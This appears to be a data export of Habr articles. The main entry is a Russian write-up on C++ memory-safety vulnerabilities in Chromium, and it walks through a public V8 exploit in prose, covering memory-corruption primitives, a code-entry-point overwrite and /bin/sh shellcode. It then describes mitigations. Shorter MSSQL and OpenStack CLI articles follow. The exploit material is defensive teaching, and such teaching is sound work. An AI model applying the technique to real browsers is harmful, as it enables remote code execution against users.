“NSA advises organizations to consider making a strategic shift from programming languages that provide no memory protection, such as C/C++, to a memory safe language
when possible.” 

«NSA советует организациям принять стратегическое решение о переходе с незащищенных языков, таких как С/C++, на языки с защитой памяти, если возможно».

https://media.defense.gov/2022/Nov/10/2003112742/-1/-1/0/CSI_SOFTWARE_MEMORY_SAFETY.PDF 

На этом, наверное, можно было бы и разойтись. Но разработчики С++ — народ стойкий, привык справляться с трудностями. Поэтому далее обсудим три темы: уязвимости, эксплойты и возможные митигации.

Уязвимости
С уязвимостями, наверное, сталкивались все. Это ошибки в программах, которые можно злонамеренно использовать. Еще одна цитата NSA (да, я буду вспоминать эту организацию довольно часто):

“Microsoft revealed at a conference in 2019 that from 2006 to 2018 70 percent of their vulnerabilities were due to memory safety issues. Google also found a similar percentage of memory safety vulnerabilities over several years in Chrome.“

«Microsoft и Google заявили, что 70% уязвимостей связано с ошибками работы с памятью. 70% уязвимостей, найденных в коде Microsoft и Google, связаны с ошибками памяти». 

В докладе присутствует ссылка на Google, в частности на Chromium. Chromium — это довольно большая и открытая база кода на С++ — 15 млн строк. Кроме того, в проекте открыт bug-трекер и тикеты, в том числе касающиеся безопасности. Поэтому примеры я возьму именно оттуда.

В докладе NSA в качестве примеров уязвимостей предлагают рассмотреть следующее:

Переполнение буфера
Use after free
Гонки
Неинициализированные переменные
Утечка памяти

Понятно, что данный список далеко не полный.

Первые три пункта — хорошо известные проблемы. Их мы рассмотрим на примерах — оценим, что собой представляют эти уязвимости. Четвертый и пятый пункты нам не сильно интересны. Четвертый пункт — весомый, но эти ошибки легко фиксятся и в кодовую базу Chrome не попадают даже на этапе коммита. Утечки памяти — серьезнее, но большой проблемой именно безопасности не являются, поскольку приводят максимум к отказу в обслуживании.

Переполнение буфера


Переполнение буфера — это классика, поэтому пример будет очень простой. Совсем недавно в Chrome был заведен баг на такую CVE. Нашлась небезопасная функция chartorune, которая конвертирует строку в UTF8. 


Issue 1346675: Security: UTF chartorune heap-buffer-overflow crash (https://bugs.chromium.org/p/chromium/issues/detail?id=1346675) 
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0138 

Символ в кодировке UTF-8 может занимать от 1 до 4 байт. На вход подается простая строка char, но в небезопасной версии функции нет контроля размера. В нее можно легко передать строку в 1 байт, которая должна конвертироваться в 4-байтный символ UTF-8. 


Как вызвать переполнение буфера
На вход подается значение F2 (1111 0010) размером 1 байт.
Старшие биты 11110 означают, что символ требует 4 октета, однако
на входе только 1.



В коде при этом есть безопасная версия этой функции — она и используется в Chrome. Пользователь, обнаруживший баг, опубликовал еще однострочный фаззинг-тест, приведенный на скриншоте.

Баг хотели завернуть фактически на старте, потому что небезопасная функция chartorune в продакшн-коде Chrome не использовалась, она применялась только в тестах. Однако чуть позже нашли практически аналогичную небезопасную функцию со схожим названием в другой библиотеке. Пришлось все это пофиксить — выпилить код, который использует небезопасную версию, написать фаззинг на безопасную и сделать хук на коммитах, запрещающий использование небезопасной версии (на том, что такое фаззинг, я остановлюсь позже).

За такой простой баг по программе «баг баунти» в Google заплатили неплохие деньги — 7000 долларов, выдав также 1000 долларов бонуса за однострочный фаззинг-тест.

Use after free
Повторное использование освобожденного объекта — еще одна классическая уязвимость, которая встречается чуть реже, чем постоянно.



Здесь пример посложнее — тоже с CVE. Баг примечателен тем, что найден был в core-классе WorkerThread, который используется в библиотеке Blink. А опасность его в том, что он аффектит практически весь Blink.


Issue 1372695: Security: heap-use-after-free third_party\blink\renderer\core\workers\worker_thread.cc:905 in blink::WorkerThread::PauseOrFreezeOnWorkerThread (https://bugs.chromium.org/p/chromium/issues/detail?id=1372695) 
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3887 

Проблема заключается в том, что глобальный скоуп в 17-й строке может разрушиться. Происходит это после хэндлера паузы, которая вызывается на 4-й строке. В целом ситуация вполне стандартная — какой-то объект разрушается, а потом мы его используем.

Фиксят такие баги двумя способами. Мы можем либо гарантировать живучесть объекта на всем протяжении существования нужного скоупа, либо проверить его живучесть перед использованием. В данном случае пошли вторым путем — ввели фабрику weak-поинтеров.



Это баг с более высоким приоритетом, хотя за него заплатили столько же — 7000 долларов. Бонус не начислили, потому что фаззинга нет.

Состояние гонки


В качестве примера предлагаю рассмотреть баг Race condition, который был найден в движке JavaScript V8. Race condition касается одной из оптимизаций этого движка — JSCreateLowering. Но чтобы понять, как этот баг воспроизводится, нужны небольшие пояснения.

Приведенный ниже фрагмент кода написан на JavaScript, это не С++ (воспроизводить мы будем на JavaScript, раз уж это его движок, но под капотом движка — C++). В этом фрагменте нас интересует функция «a», в которой создается некий массив вещественных чисел.


Issue 1369871: Security: Race condition in JSCreateLowering, leading to RCE (https://bugs.chromium.org/p/chromium/issues/detail?id=1369871)
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3652 

Следующей строкой идет математическая функция, которая должна указать компилятору, что «а» — высоконагруженная. Чтобы компилятор ее оптимизировал — выполнил JIT-компиляцию, дополнительно мы еще должны ее несколько раз вызвать.

Чтобы воспроизвести баг, в одном конкретном случае нужно поменять тип объекта в массиве — с вещественных чисел на объекты. Из-за гонки весь массив будет думать, что он содержит объекты, а не вещественные числа, соответственно, произойдет падение, поскольку с его точки зрения мы попытаемся обратиться к непонятному адресу.

Почему это происходит?

Движок V8 — это не только компилятор (Turbofan), но и интерпретатор (Ignition). Причем интерпретация и компиляция происходят параллельно — в два потока. Интерпретатор начинает выполнение (на рисунке ниже он показан первым столбиком), а компилятор запускается в некий недетерминированный момент, допустим, на 9-й строке. На рисунке представлен один из вариантов развития событий:


https://www.freecodecamp.org/news/javascript-under-the-hood-v8/ 

На девятой строке запустился компилятор и понял, что массив содержит объект, а не вещественное число (именно на девятой строке меняется тип объекта). Код откомпилировался с учетом того, что в массиве лежат объекты. В районе 20-й строки компиляция закончилась. В 21-й строке тип объекта снова поменялся. По идее мы должны были сбросить оптимизацию, но этого не произошло, поскольку в коде ошибка.

Фиксится это добавлением в код компилятора так называемых dependency. Это некие ограничения, когда можно использовать оптимизацию, а когда нельзя. Если dependency срабатывает, оптимизация должна удалиться — это так называемый процесс деоптимизации. Здесь показана одна из dependency (но на самом деле вставили их несколько):


Добавили дополнительную проверку на использование оптимизации JSCreateLowering

Серьезность этого бага была максимальной — такие обычно попадают в новости. На него есть RCE плюс эксплойт. В итоге за этот баг заплатили 20 тысяч долларов. Это фактически максимум, который платит программа bug bounty от Google.

Эксплойты
Эксплойт — это программа или кусок кода, которые могут использовать уязвимости в продуктах, в чужом коде, чтобы выполнить какие-то свои злонамеренные действия. Обычно с помощью эксплойтов запускается некий чужой код.

Еще одна цитата из отчета NSA:

“Exploiting poor or careless memory management can allow a malicious cyber actor to perform nefarious acts, such as crashing the program at will or changing the instructions of the executing program to do whatever the actor desires.” 

«Эксплуатация уязвимостей памяти может привести к намеренному завершению работы программы или выполнению произвольного кода».

https://media.defense.gov/2022/Nov/10/2003112742/-1/-1/0/CSI_SOFTWARE_MEMORY_SAFETY.PDF

Крашинг программы на самом деле не очень страшен. А вот запуск злонамеренного кода — уже очень опасно. Потенциально это RCE — Remote Code Execution — и полный контроль над системой.

Вернемся к уже обсуждавшемуся багу, к которому был приложен эксплойт.
Я проведу вас через квест написания эксплойтов на JavaScript. Будет много интересных низкоуровневых подробностей. 

Начало эксплойта — вот такой кусок кода на JavaScript:



Здесь уже много вопросов.

Первый вопрос — это фейковая строка (fake_str), какой-то набор шестнадцатеричных чисел. На самом деле это карта памяти с тремя объектами, которую мы сами сгенерили, — подобрали такими, какие нам нужно:

Первый объект — особый массив вещественных чисел, элементы которого указывают не на специально выделенную область памяти, а на следующий массив. Этим фактом мы будем пользоваться.
Дальше массив holey — массив дырок пустых объектов. 
И массив UINT32. 

У второго и третьего массивов память под элементы выделена, а в карте памяти это зафиксировано.

Вторая строка — это evil_func. По названию можно догадаться, что это злонамеренный код, который мы будем пытаться запустить. Он выглядит странно, потому что на самом деле это shell-код, преобразованный в ассемблерный. Это запуск /bin/sh, который записан со смещением в 103 байта. Дальше я покажу, для чего это было сделано. 

Еще один момент, о котором нужно помнить, — многократный запуск функции, чтобы включить оптимизацию и выполнить JIT-компиляцию. Это происходит в седьмой строке.

Воспроизведение бага несколько изменилось — появились определенные странные значения вещественных чисел.



В JavaScript V8 вещественные числа хранятся в виде 64-битных значений, т. е. в двух вещественных числах можно записать четыре 32-битных значения — четыре 32-битных адреса. Адрес имеет такую длину, потому что в движке V8 используется так называемое сжатие адресов — берутся только младшие 32 бита, а старшие хранятся отдельно. Получается, что обратиться можно только в пределах младших адресов — это так называемая «песочница» памяти V8.

В первое значение запишем адрес первого фейкового массива. Во второе значение — адрес второго, а в третье — третьего массива. В четвертое значение запишем некий выдуманный «магический» адрес.

В двадцатой строке массив будет покарапчен, и мы этим воспользуемся. Чтобы узнать базовый адрес фейковых массивов, достаточно просто определить адрес строки fake_str (он всегда будет таким, при любом запуске этого кода).

На следующем этапе квеста мы выполняем дополнительную подготовку — проверяем специальное значение. Так мы узнаем, что баг воспроизвелся, т. е. массив считает свое содержимое объектами. Мы это можем даже посмотреть в дебаггере.



На скриншоте видно, что первые три элемента в дебаггере — адреса, указывающие на фейковые массивы. Четвертый элемент — то самое специальное число. В данном случае оно приведено в десятичном виде. Таким образом, все пошло хорошо и мы можем воспользоваться багом. 

Для удобства использования объявим объекты — три фейковых массива.



Также мы здесь объявляем примитив addrof, который позволяет получить адрес любого объекта, поданного на вход.

Немного остановимся на принципе работы addrof. В нашем случае мы записываем объект в нулевую позицию второго массива. При записи объекта фактически в память записывается его адрес, а чтобы его прочитать, мы должны обратиться к нему через первый массив, который является массивом вещественных чисел. Именно это значение будет содержаться в третьем элементе первого массива, поскольку у нас было сделано специальное перекрытие. Получается, мы можем вычитать адрес любого объекта, который подадим на вход. Останется преобразовать число в адрес и вычесть единицу — это особенность движка V8 (самый младший бит означает тег, показывающий, что объект находится в куче).

Второй примитив — caged_read. Он предназначен для чтения данных из любой области памяти по заданному адресу.



Он работает так: мы записываем массив в десятую позицию, где находится указатель на элементы нашего третьего массива. Фактически мы переписываем указатель на элементы. При чтении данных из третьего массива мы будем читать их по адресу, который записали туда в качестве указателя на элементы.

Caged_write работает точно так же, с той разницей, что вместо чтения производится запись. 

Мы наконец подготовили все нужное для эксплойта. Осталось его запустить — выполнить код злонамеренной функции evil_funс. 



Чтобы это сделать, с помощью примитива addrof нужно определить адрес злонамеренный функции. Дальше по смещению 0х18 после этого адреса прочитать секцию code (это адрес контейнера кода, вторая ступень матрешки). После этого по смещению 0х10 читаем значение code_entry_point — это уже непосредственно код, который будет выполняться. Мы должны добавить к нему наше предопределенное смещение 103, после чего записать обратно в code_entry_point получившийся адрес. Останется только запустить evil_func и выполнить эксплойт.

Это довольно сложный эксплойт, но с его помощью можно сделать реальную RCE — запустить код JavaScript удаленно в браузере. Есть небольшой нюанс — если это сделать из Chrome, то, к сожалению, или, может быть, к счастью, эксплойт не сработает, поскольку в Chrome есть защитные механизмы против этого (на них я еще остановлюсь далее). Однако если запустить его в консоли V8, то действительно откроется bin/sh.

Митигации
Покончим с плохими новостями и перейдем к хорошим — какие есть митигации (защитные механизмы, которые позволяют либо полностью устранить проблему, либо ограничить ее последствия) для противодействия уязвимостям и эксплойтам.

В докладе NSA указаны классические митигации:

Харденинг
Статический и динамический анализ
Фаззинг-тесты
Использование безопасных языков
«Песочницы» (sandbox)

Пятый пункт — добавление от меня, в оригинальном докладе он не упоминается, хотя это очень мощный механизм митигации. Далее расскажу, что это такое. Само NSA в качестве убер-решения предлагает использовать безопасные языки.

Я в двух словах пройдусь по классическим митигациям. По этой теме довольно много информации, и желающие могут в нее углубиться самостоятельно.

Харденинг


Самая простая митигация — это харденинг, дополнительные меры защиты, добавляемые в продукт для противодействия эксплойтам. Простая — потому что ее довольно просто использовать. Достаточно включить дополнительные опции (некоторые опции даже включать не надо, они включаются по умолчанию) компиляции, и в продукте автоматически появляются некие защитные механизмы. В докладе NSA указаны в качестве примера три опции:

Control Flow Guard (CFG) — валидация неявных вызовов (indirect calls) из виртуальных функций. Это изобретение Microsoft. Вызовы обкладывают дополнительными проверками, при этом добавляя overhead как по размеру, так и по перформансу.
Address Space Layout Randomization (ASLR) — случайное расположение в адресном пространстве процесса важных структур данных: стека, кучи, библиотек и т. д. Это затрудняет злоумышленнику передачу управления в разные сегменты программы.
Data Execution Prevention (DEP) — позволяет системе пометить одну или несколько страниц памяти как не исполняемые. Например, куче исполняться не нужно.

На самом деле их намного больше — несколько десятков.

Несмотря на то что харденинг прост для внедрения, он не является панацеей. Практически все опции харденинга в той или иной степени обходятся злоумышленниками. И многие из этих опций добавляют overhead как по перформансу, так и по размеру. Некоторые функции могут отвалиться, например, при использовании DEP не будет работать JIT-компиляция. В целом в нем много подводных камней, а сами механизмы не очень надежны. Тем не менее отказываться от них не стоит.

Статический и динамический анализ кода


Со статическим и динамическим анализом кода тоже многие знакомы. И скорее всего многие используют. 

У статического и динамического анализа разные характеристики — разные моменты срабатывания, зоны покрытия, условия ложного срабатывания. Единственное, что их объединяет, это то, что их обычно комбинируют — используют в паре.



Вот инструменты, которые используются в «Лаборатории Касперского» и в Google. 



Тулчейн clang tidy Google сам пилит для себя. В «Лаборатории Касперского» применяется чуть больше инструментов, поскольку мы на clang не повязаны. Но в целом смысл один и тот же.

Фаззинг


Фаззинг — это специальный вид тестов, который осуществляет многократный перебор входных значений для поиска проблемной комбинации.

Здесь приведен общий алгоритм для большинства современных фаззеров. Все они основаны на одной схеме — мутация данных осуществляется на основе анализа покрытия. 



Тема фаззинга очень сложная и обширная. Поднять инфраструктуру фаззинга не просто, добиться нужного покрытия — тоже. 

И в Google, и в «Лаборатории Касперского» для фаззинга используются одни и те же инструменты.



Два основных инструмента сейчас — это AFL и libfazzer. syzcaller используется для фаззинга ядер ОС. У Google есть своя инфраструктура для фаззинга ClusterFuzz. Она открытая (это облачная ферма). А OSS Fuzz — проект, который позволяет запостить любой опенсорсный продукт для фаззинга. В «Лаборатории Касперского» для этого используется своя ферма.

Безопасные языки
В качестве убер-решения, закрывающего все проблемы, NSA рекомендует использовать безопасные языки. Такие языки предлагают различные механизмы защиты памяти. Но обратной стороной являются производительность и гибкость.



В качестве безопасных языков NSA предлагает такой список: 
Examples of memory safe language include C#, Go, Java, Ruby, Rust, and Swift (https://media.defense.gov/2022/Nov/10/2003112742/-1/-1/0/CSI_SOFTWARE_MEMORY_SAFETY.PDF) 

Насколько они безопасны, который из них лучше, я сейчас не буду рассказывать.

«Песочницы»


По статистике, 70% уязвимостей связаны с памятью. Но кроме этого остается довольно большой и важный кусок пирога — 30%. Здесь я попытался накидать, что это может быть, кроме работы с памятью. Список получился довольно большой.



Безопасные языки митигируют 70% уязвимостей, есть ли способ митигировать все 100%? Можно попробовать с помощью механизма «песочниц» или sandbox. Немногие о нем знают, очень мало кто их использует.

Чтобы рассказать об этом механизме, вернусь к браузеру Chromium, который изначально разрабатывался с заложенной безопасностью.



Архитектура браузера продиктована митигацией рисков уязвимостей при запуске чужого кода (на JavaScript или других языках), который приходит удаленно. Получается многопроцессная архитектура, в которой есть процессы Renderer, Network, GPU, Utility и главный процесс браузера — Browser Process. И все они, кроме Browser Process, работают в так называемых «песочницах», которые накладывают на процессы некие ограничения. Как описано в документации Chrome, механизм «песочниц» не должен влиять на перформанс разрешенных вызовов (влияние есть на запрещенные вызовы). Все мы пользуемся Chrome и не замечаем тормозов.

В каждой операционке «песочницы» реализованы по-разному. Но браузер Chromium работает почти на всех операционках, поэтому поддерживает механизмы «песочниц» всех мастей. 

В Windows нет «песочницы», выделенного механизма API или подмодуля, который бы целостно ограничил запускаемый код. Но в Chrome написали свою «песочницу», которая работает следующим образом (https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox.md):



В главном процессе в брокере запускается движок политик. Его задача — определить, является ли вызов от таргетного процесса валидным. Таргетные процессы, которые запускаются в sandbox, имеют перехватчики системных вызовов. Эти перехватчики оборачивают вызовы в IPC и посылают процессу брокеру на контроль разрешения на выполнение этого syscall.

Чтобы добавить дополнительные ограничения в таргетные процессы, в Windows есть некоторые ограничивающие механизмы:

Так называемый Restricted token. Он передается при запуске процесса. При его создании накладывается очень много ограничений (полный список ограничений можно найти по ссылке https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox.md).
Job object — этот механизм позволяет добавлять в Job несколько процессов. В Chrome добавляется один процесс, и Job тоже накладывает свои ограничения (по той же ссылке можно найти их список).
Альтернативный десктоп — все «песочницы» запускаются в своем десктопе. При этом, конечно, десктопы пользователю не видны. Они создаются API-шками, существуют виртуально, но позволяют запретить передачу Windows сообщений между окнами.
Механизм уровней целостности — набор SID и ACL, которые задают процессу пять уровней привилегий от untrusted до system. Можно сказать, что это реализация модели безопасности Биба.

В Linux дела с «песочницами» обстоят чуть лучше, поскольку есть полноценный API, который их поддерживает, — User namespaces. Это API для механизма контейнеризации. Причем существуют разные виды этих namespaces. В Chrome используются три вида: юзерский, процессный и сетевой, которые накладываются как матрешка.


https://chromium.googlesource.com/chromium/src/+/HEAD/docs/linux/sandboxing.md

Второй механизм Linux-«песочниц» — это фильтр syscall-ов под названием seccomp-bpf. Эта штука довольно мощная — позволяет гранулярно выставлять политики на вызов всех syscall. Проблема в том, что он писался не для людей, поэтому API у него очень замороченный, а задание политик проблематично.

На MacOS есть свой механизм фильтрации syscall, который называется seatbelt. Работает он чуть более приближенно к пользователю. API здесь уже причесан, и политики можно задавать в довольно читаемом текстовом виде. 


https://www.chromium.org/developers/design-documents/sandbox/osx-sandboxing-design/ 

В целом можно сказать, что это более причесанный вариант механизма Seccomp.

В KasperskyOS есть нативный и простой для использования механизм запуска в «песочнице», который не позволяет запустить никакие процессы (кроме микроядра) иначе. В «песочнице» работают даже драйверы и системные приложения.


https://os.kaspersky.ru/technologies/cyber-immunity/ 

И это не единственная особенность. KasperskyOS отличается:

микроядром; 
взаимодействием между процессами по IPC (и это единственный канал взаимодействия);
модулем безопасности, который контролирует эти IPC-вызовы;
языком описания политик;
методологией разработки безопасных решений кибериммунитета. 

В перспективе мы в KasperskyOS планируем достичь нулевого оверхеда по производительности от встроенных механизмов безопасности. И если вы хотите поучаствовать в развитии ОС или в целом заняться вопросами безопасности кода С++ не в ущерб перформансу, приходите к нам в команду.

А проверить, достаточно ли хорошо вы знаете сам язык, можно в этой игре про умный город. 

Выводы
Есть плохие новости:

70% уязвимостей в продуктах связано с ошибками работы с памятью.
С++ не обеспечивает безопасную работу с памятью.
Эксплуатация уязвимостей позволяет запускать чужой код (RCE), получить полный контроль над системой и не только.

Есть новости получше:

Можно значительно снизить риск появления ошибок (и связанных с ними уязвимостей), если использовать стандартные митигации: фаззинг-тесты, статический и динамический анализ.
Можно значительно снизить риск эксплуатации уязвимостей, если использовать различные опции харденинга — усложнить жизнь злоумышленникам, которые нашли уязвимости.
Можно совсем избавиться от ошибок памяти, если использовать безопасные языки. Но так мы избавимся только от 70% уязвимостей.

Есть хорошие новости:

Можно практически полностью устранить последствия взлома, если запускать код в «песочнице» (sandbox).
Если мы хотим на 100% обезопасить продукт, то нужно использовать специальные техники безопасного дизайна — это вопрос на уровень выше.

Дополнительно почитать:

Можно обеспечить безопасность выполнения отдельных сценариев на 100%, не смотря на уязвимости языка и возможные взломы, если использовать подход «secure by design»[13] («Меньше багов богу разработки: плюсы, минусы и нюансы имплементации подхода Secure by design», https://habr.com/ru/companies/kaspersky/articles/725360/). 
",2024-01-26
Самый старый код в MSSQL,20,0,https://habr.com/ru/articles/788988/,"Ваш покорный слуга работал с MSSQL с версии 6.5, но в качестве экзотики застал версии 6.0 и 4.2. Да, я супер стар!Но осталось ли в MS SQL что-либо с тех времен? Кодовая базаДинозавры от IT, вероятно, помнят, что MS SQL - это форк Sybase, случившийся в 1993 году. Версии Sybase 4.2 и MSSQL 4.2 были, как я понимаю, полностью совместимыми. Более того, так как MSSQL опережала Sybase с развитием GUI, то Management Studio от MSSQL использовали для Sybase.Дальше кодовая база стала отличаться, но совместимость сохранялась, по моему, до версии 6.5. Внешне Management Studio тогда сильно отличался от современного. Например, вы создавали database devices, и располагали на них базу или разные базы. То есть один файл мог относиться к разным базам.Глобальный редизайн продукт претерпел в 1998 году с выходом версии 7.0, которая уже примерно выглядела так, как выглядит сейчас. Однако в кодовой базе было еще много кода, доставшегося от Sybase в наследство, и только в версии 2005 наконец весь код был переписан.Я слышал, что в Microsoft был даже неформальный праздник по поводу выкидывания последней строчки Sybase. На пути к этому этапу им часто приходилось решать проблемы: в коде Sybase найден баг. Исправлять и кто-то использует такое поведение?Таким образом, весь код MSSQL сейчас не старше 1998 года - версии 7.0. Но...Преданья старины глубокойНо в MS SQL есть активно используемые технические решения, которые ведут свое происхождение из начала 90х!Вы наверняка знаете, о чем я:Дата запуска, время запуска, время выполнения - это просто целые числа, в которых кодируются времена и даты в самом обкуренном из возможных вариантов. Например, если вы ходите перевести длительность в секунды, и получить время запуска как datetime, то можете написать примерно такой код:select 
  dateadd(ss,runtimeh*3600+runtimem*60+runtimes,convert(datetime,convert(varchar,run_date))) as rundate,
  runtimeh*3600+runtimem*60+runtimes as runtime_seconds,
  durh*3600+durm*60+durs as duration_seconds
from (
select top 10 
  run_time/10000 as runtimeh, run_time/100%100 as runtimem, run_time%100 as runtimes, 
  run_duration/10000 as durh, run_duration/100%100 as durm, run_duration%100 as durs,
  run_date
  from msdb..sysjobhistory) QИли воспользоваться недокументированной функцией agent_datetime.Код выше уродлив, но работать будет быстрее, чем функция.Почему же так вышло?SQL agent уже существовал в версии 4.2. Соответственно, это извращение было сделано в Sybase. Почему? Скорее всего потому, что типы date и time появились много позже, вначале же существовал datetime, который не совсем подходит для этой задачи (например, расписание часто содержит время без даты).Не думаю, что это когда-либо исправят. Но если бы появились view в msdb где видны нормальные значения, то это было бы здорово.Ну и, как сейчас принято на Хабр, подписывайтесь на мой телеграмм канал. Хотя... черт, у меня нет никакого телеграмм канала...",2024-01-26
Как создать 100 серверов в облаке за минуту? Базовая работа с OpenStack клиентом,21,1,https://habr.com/ru/companies/selectel/articles/788958/,"
Для управления облачной инфраструктурой в индустрии накопилось достаточно много инструментов: terraform, pulumi, ansible, управление через SDK или напрямую через REST API.

При этом, часто упускают из виду CLI инструменты в связке с shell-автоматизацией. А зря! Они помогают экономить время, которое тратится на ручное создание серверов или изучение сложных инструментов.

Предположим, что нам нужно создать пачку серверов для каких-то тестов или калькуляций. Можно только предположить, сколько времени потратится на ручное создание серверов через панель управления и сколько будет допущено ошибок из-за человеческого фактора.

А с помощью CLI клиента OpenStack можно создать наши условные 100 серверов одной командой.

openstack server create --image ""Ubuntu 22.04 LTS 64-bit"" --network my_network --flavor SL1.1-2048-16  --max 100 my_server

Собственно, все. На этом можно закончить статью. Но для тех, кому интересно, что тут происходит и как работать с CLI, рассмотрим происходящее более подробно.

Используйте навигацию, если не хотите читать текст полностью:
→ Знакомство с OpenStack CLI 
→ Практика 
→ Работа с сетевыми объектами
→ Работа с сетевыми дисками
→ Итоги и шпаргалка

Знакомство с OpenStack CLI 
Сразу оговорка — создание виртуальной машины (сервера, инстанса) с локальным диском отличается от создания ВМ с сетевым диском. В первом случае локальный диск является частью Flavor-а, а из образа диска сразу создается ВМ. Во втором — из образа диска делается вольюм, а он передается при создании ВМ.

Давайте представим исходную ситуацию: у вас есть пустой проект в облачной платформе Selectel. И работать мы будем с консольным инструментом OpenStack CLI.

Подготовительные этапы:

установить OpenStack клиент, 
добавить сервисного пользователя с ролью администратора проекта, 
скачать RC-файл на компьютер с OpenStack клиентом. 

Загружаем RC-файл с переменными окружения, необходимыми для авторизации OpenStack клиента. Работа с указанным выше RC-файлом предполагает введение пароля из консоли. Можно отредактировать файл и прописать пароль в файле, чтобы не вводить его каждый раз при инициализации переменных окружений. Но это не совсем безопасно.

Активируем переменные окружения:

source rc.sh

Базово создать один сервер с локальным диском можно следующей командой:

openstack server create --image 'Ubuntu 22.04 LTS 64-bit' --network my_network --flavor SL1.1-2048-16 my_server

Необходимые аргументы:

image — исходный образ диска, из которого создаётся ВМ,
flavor — объект, содержащий конфигурацию ВМ,
network — сеть, в которой создается ВМ. 

С сетевым диском алгоритм будет чуть другой — такой пример рассмотрим далее, а пока упростим себе задачу и будем работать с локальным диском. 

OpenStack состоит из нескольких компонентов, отвечающих за свою часть работы и предоставляющих собственные эндпоинты. При работе с клиентом мы можем об этом не думать, т.к. он сделает все за нас. Но хочется выделить логические блоки для понимания концепций:

Keystone — сервис авторизации и получения эндпоинтов компонентов и регионов, 
Nova (Compute) — сервис для создания ВМ (серверов, инстансов),
Neutron (Network) — сервис по управлению сетевыми ресурсами,
Glance (Images) — сервис для хранения образов (с ОС), из которых создаётся непосредственно сама ВМ или Volume, 
Cinder (Volume) — сетевые диски. 


Практика 
Перейдем к практике и через CLI поработаем с объектами образов, сети и Flavor-а.

Получаем список образов:

openstack image list

Пример использования (вывод обрезан для более удобного отображения):

openstack image list
+--------------------------------------+------------------------------------------+--------+
| ID                                   | Name                                     | Status |
+--------------------------------------+------------------------------------------+--------+
| 41383415-4c61-46e5-8cc4-ead5a6f78cf8 | CentOS 7 64-bit                          | active |
| 159f6bfa-d2fd-4d90-b2cc-e19d8aeafd22 | CentOS 7 Minimal 64-bit                  | active |
| 49653158-53a4-4cfe-95e0-b70509e6c1ac | CentOS 8 64-bit                          | active |
| 0b6fb188-0df5-46cf-9111-2840195df219 | CentOS 8 Stream 64-bit                   | active |
| a1b081d7-9eff-44b0-8d3f-85fabf2c88a6 | CentOS 9 Stream 64-bit                   | active |
| 7a827898-058b-4faf-bf8a-0d2311bef7c3 | Ubuntu 20.04 LTS 64-bit                  | active |
| 1fd341e8-82c2-4421-8a37-912cd5ee3ae3 | Ubuntu 22.04 LTS 64-bit                  | active |
......
+--------------------------------------+------------------------------------------+--------+

Получаем список Flavor-ов.

В OpenStack при создании ВМ необходимо передать идентификатор объекта Flavor. Можно считать это конфигурацией сервера — память, диск, количество CPU.

Смотрим доступные Flavor-ы.

openstack flavor list

Пример команды. Вывод обрезан.

openstack flavor list
+--------------------------------------+------------------------------------+--------+------+-----------+-------+-----------+
| ID                                   | Name                               |    RAM | Disk | Ephemeral | VCPUs | Is Public |
+--------------------------------------+------------------------------------+--------+------+-----------+-------+-----------+
| 1                                    | m1.tiny                            |    512 |    0 |         0 |     1 | True      |
| 1011                                 | SL1.1-1024                         |   1024 |    0 |         0 |     1 | True      |
| 1012                                 | SL1.1-2048                         |   2048 |    0 |         0 |     1 | True      |
| 1013                                 | SL1.2-4096                         |   4096 |    0 |         0 |     2 | True      |
| 1014                                 | SL1.2-8192                         |   8192 |    0 |         0 |     2 | True      |
| 1015                                 | SL1.4-16384                        |  16384 |    0 |         0 |     4 | True      |
| 1016                                 | SL1.6-32768                        |  32768 |    0 |         0 |     6 | True      |
| 1017                                 | SL1.8-32768                        |  32768 |    0 |         0 |     8 | True      |
| 1018                                 | SL1.12-49152                       |  49152 |    0 |         0 |    12 | True      |
| 1019                                 | SL1.16-65536                       |  65536 |    0 |         0 |    16 | True      |
| 1020                                 | SL1.24-98304                       |  98304 |    0 |         0 |    24 | True      |
| 1311                                 | SL1.1-1024-8                       |   1024 |    8 |         0 |     1 | True      |
| 1312                                 | SL1.1-2048-16                      |   2048 |   16 |         0 |     1 | True      |
| 1313                                 | SL1.2-4096-32                      |   4096 |   32 |         0 |     2 | True      |
| 1314                                 | SL1.2-8192-64                      |   8192 |   64 |         0 |     2 | True      |
| 1315                                 | SL1.4-16384-128                    |  16384 |  128 |         0 |     4 | True      |
| 1316                                 | SL1.6-32768-256                    |  32768 |  256 |         0 |     6 | True      |
| 1317                                 | SL1.8-32768-384                    |  32768 |  384 |         0 |     8 | True      |
| 1318                                 | SL1.12-49152-512                   |  49152 |  512 |         0 |    12 | True      |
| 1319                                 | SL1.16-65536-768                   |  65536 |  768 |         0 |    16 | True      |
| 1320                                 | SL1.24-98304-1024                  |  98304 | 1024 |         0 |    24 | True      |

При необходимости можно создать Flavor командой openstack flavor create …

Обратите внимание, что у одних Flavor-ов поле Disc нулевое, а у других со значениями. Для использования flavor с нулевым диском нужно предварительно создать volume (сетевой диск). С ненулевым значением будет использоваться локальный диск.


Для начала создадим приватную сеть:

openstack network create my_network

Создадим в ресурс subnet в созданном network:

openstack subnet create --subnet-range 192.168.0.0/24 --network my_network my_subnet

Ремарка — сейчас не создается роутер и не настраивается маршрутизация. Таким образом, не будет работать «выход» в интернет. Об этом далее.

SSH Keypair
Если сейчас создать сервер, то заходить по SSH можно будет только по паролю. Это может быть неудобно и небезопасно, поэтому добавим публичную часть персонального ssh-ключа в хранилище. Затем можем указывать данный ключ при создании ВМ.

openstack keypair create --public-key ~/.ssh/id_rsa.pub my_keypair

Теперь можно создать наши условные 100 серверов:

openstack server create --image ""Ubuntu 22.04 LTS 64-bit"" --network my_network --flavor SL1.1-2048-16 --key-name my_keypair --max 100  my_server

Проверим созданные серверы с помощью команды openstack server list:

openstack server list

Пример команды, вывод обрезан.

openstack server list
+--------------------------------------+---------------+--------+--------------------------+-------------------------+---------------+
| ID                                   | Name          | Status | Networks                 | Image                   | Flavor        |
+--------------------------------------+---------------+--------+--------------------------+-------------------------+---------------+
| 031080fa-3aa0-4848-8551-fd1e6f6ec65f | my_server-94  | ACTIVE | my_network=192.168.0.58  | Ubuntu 22.04 LTS 64-bit | SL1.1-2048-16 |
| 03864c9b-6b9b-4bea-8679-93367ca52250 | my_server-87  | ACTIVE | my_network=192.168.0.24  | Ubuntu 22.04 LTS 64-bit | SL1.1-2048-16 |
